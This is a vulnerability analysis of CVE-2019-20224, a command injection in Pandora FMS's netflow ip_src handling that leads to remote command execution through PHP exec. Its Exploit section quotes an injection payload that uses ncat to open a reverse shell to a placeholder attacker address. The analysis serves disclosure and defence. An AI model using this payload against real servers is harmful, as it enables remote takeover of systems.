## Analysis of CVE-2019-20224 based on provided content

The provided content contains detailed information about CVE-2019-20224, an authenticated remote command execution vulnerability in Pandora FMS v7.0NG.

**Summary of Vulnerability**
Pandora FMS is a monitoring software. The vulnerability allows an authenticated attacker to inject a malicious input handling an IP address, leading to remote command execution.

**Root Cause:**
The vulnerability stems from injecting a malicious input into the ip_src parameter that handles an IP address, which is then used to generate graphs. This crafted request is sent to the netflow_get_stats function, which subsequently calls netflow_get_command to generate the command. The netflow_get_filter_arguments function parses the input and passes it to the exec function within netflow_get_stats, triggering the payload.

**Vulnerability Details:**

*   **Weakness:** Improper input validation in the netflow\_get\_filter\_arguments function. Specifically, the netflow\_is\_net function, intended to validate hostnames or IP addresses, inadequately checks the input.
*   **Attack Vector:** Sending a crafted request with a malicious payload in the ip\_src parameter to the netflow\_get\_stats function.
*   **Exploitation:** The payload is processed by netflow\_get\_command and netflow\_get\_filter\_arguments, eventually reaching the exec function.

**Impact:**

*   **Impact of Exploitation:** Remote command execution, allowing the attacker to execute arbitrary commands on the server.
*   **Attacker Capabilities:** The attacker needs to be authenticated to exploit this vulnerability.
*   **Attack Vector:** The vulnerability is triggered via a crafted HTTP POST request.

**Technical Details:**

*   The vulnerability is located in "functions\_netflow.php".
*   The "netflow\_get\_stats" function passes the "filter" variable to the "netflow\_get\_command" function.
*   The final command is concatenated with a variable from Pandora's configuration and the output of "netflow\_get\_filter\_arguments".
*   The "netflow\_get\_filter\_arguments" function uses the "netflow\_is\_net" function to validate the "ip\_src" input.
*   The "netflow\_is\_net" function checks if the input starts with "/", but this is insufficient to prevent command injection.
*   The final command is executed using the PHP `exec` function.

**Exploit:**
The provided exploit code leverages a crafted graph request to inject commands. The payload `";ncat -e /bin/bash <attacker_ip> <attacker_port> #"` is injected into the ip\_src parameter, which results in a reverse shell being executed on the PandoraFMS server when the graph is generated.

**Mitigation:**
The vulnerability was reportedly fixed in Pandora FMS version 7.0NG 742.
